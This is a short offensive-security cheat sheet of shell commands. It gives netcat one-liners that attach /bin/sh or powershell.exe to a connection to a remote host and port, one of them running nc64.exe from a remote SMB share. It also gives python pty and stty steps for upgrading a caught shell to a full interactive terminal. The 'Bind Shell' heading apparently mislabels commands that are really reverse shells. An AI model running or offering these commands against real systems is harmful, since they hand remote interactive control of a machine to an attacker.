# Shell

## Bind Shell
```bash
nc <target> <port> -c "/bin/sh"
nc <target> <port> -e /bin/sh
```
```bash
\\<target>\hermes\nc64.exe <target> <port> -e powershell.exe
```

## Pimp a shell
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
^Z
stty raw -echo
fg
export TERM=xterm
```